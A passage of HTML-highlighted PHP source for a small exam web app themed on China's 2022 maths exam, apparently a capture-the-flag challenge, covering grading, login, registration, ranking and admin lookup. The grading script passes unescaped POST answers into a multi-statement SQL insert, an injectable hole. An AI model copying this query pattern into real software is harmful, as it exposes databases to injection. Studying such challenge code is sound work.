class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>] == <span class="variable">$row</span>[<span class="number">3</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable">$getscroe</span> = <span class="variable">$getscroe</span>+<span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>] == <span class="variable">$row</span>[<span class="number">4</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable">$getscroe</span> = <span class="variable">$getscroe</span>+<span class="number">20</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;判分错误,请刷新后重试.&lt;/br&gt;&lt;a href=&#x27;index.php&#x27;&gt;刷新&lt;/a&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from score where username=&#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows) &#123;</span><br><span class="line">            <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;用户已完成考试\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;insert into score values (NULL, &#x27;&quot;</span>.<span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;, <span class="subst">$getscroe</span>);insert into userAnswer values (NULL, &#x27;&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q1&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q3&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q4&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;q5&#x27;</span>].<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$query</span>)===<span class="literal">TRUE</span>) &#123;</span><br><span class="line">                <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;已完成考试！\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script language=&#x27;JavaScript&#x27;&gt;location.replace(&#x27;index.php&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;something error!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]!==<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;想什么呢，好好做题吧!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$studentid</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;something error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and studentid=&#x27;<span class="subst">$studentid</span>&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]));</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = (<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;studentid&#x27;</span>] = (<span class="variable">$row</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;用户名或密码错误捏&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width,initial-scale=1.0,user-scalable=no&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;<span class="number">2022</span>年全国统一高考数学试卷(理科)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;登陆&lt;/h1&gt;</span><br><span class="line">        姓名：&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        学号：&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;studentid&quot;</span> name=<span class="string">&quot;studentid&quot;</span>&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;studentid&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width,initial-scale=1.0,user-scalable=no&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;<span class="number">2022</span>年全国统一高考数学试卷(理科)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;排行榜&lt;/h1&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;暂无排行&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from score order by score desc&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_all</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$row</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                        &lt;div&gt;</span></span><br><span class="line"><span class="string">                            &lt;div align=&#x27;center&#x27;&gt;</span></span><br><span class="line"><span class="string">                                &lt;div align=&#x27;center&#x27;&gt;</span></span><br><span class="line"><span class="string">                                    &lt;h2&gt;姓名：***     得分：&quot;</span>.<span class="variable">$row</span>[<span class="variable">$i</span>][<span class="string">&quot;2&quot;</span>].<span class="string">&quot;分&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                                &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;暂无排行.&lt;/br&gt;&lt;a href=&#x27;score.php&#x27;&gt;返回查询&lt;/a&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandom</span>(<span class="params"><span class="variable">$arrend</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span> = [];</span><br><span class="line">    <span class="variable">$nums</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="variable">$arrend</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shuffle</span>(<span class="variable">$nums</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">5</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$array</span>[<span class="variable">$i</span>] = <span class="variable">$nums</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;干嘛呢，同学?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]===<span class="string">&#x27;&#x27;</span> || <span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]!==<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;想什么呢，好好做题吧!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$studentid</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;studentid&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;connect_errno) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;something error!&lt;br&gt;姓名或学号重复&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where studentid=&#x27;<span class="subst">$studentid</span>&#x27;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows) &#123;</span><br><span class="line">            <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;用户已存在\&quot;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$arrend</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select count(*) from challengesAll&quot;</span>)-&gt;<span class="title function_ invoke__">fetch_row</span>();</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">getRandom</span>(<span class="variable">$arrend</span>);</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;insert into users values (NULL, &#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$studentid</span>&#x27;);&quot;</span>;</span><br><span class="line">            <span class="variable">$query</span> .= <span class="string">&quot;insert into randChallenges values (NULL, &#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$arr</span>[0]&#x27;, &#x27;<span class="subst">$arr</span>[1]&#x27;, &#x27;<span class="subst">$arr</span>[2]&#x27;, &#x27;<span class="subst">$arr</span>[3]&#x27;, &#x27;<span class="subst">$arr</span>[4]&#x27;);&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$query</span>)===<span class="literal">TRUE</span>) &#123;</span><br><span class="line">                <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;something error!&quot;</span>.<span class="variable">$mysqli</span>-&gt;error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width,initial-scale=1.0,user-scalable=no&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;<span class="number">2022</span>年全国统一高考数学试卷(理科)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])==<span class="string">&#x27;admin&#x27;</span>):&#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;h1&gt;请输入学号以查询成绩&lt;/h1&gt;</span><br><span class="line">        学号：&lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;studentid&quot;</span> name=<span class="string">&quot;studentid&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getAns</span>(<span class="params"><span class="variable">$ans</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (<span 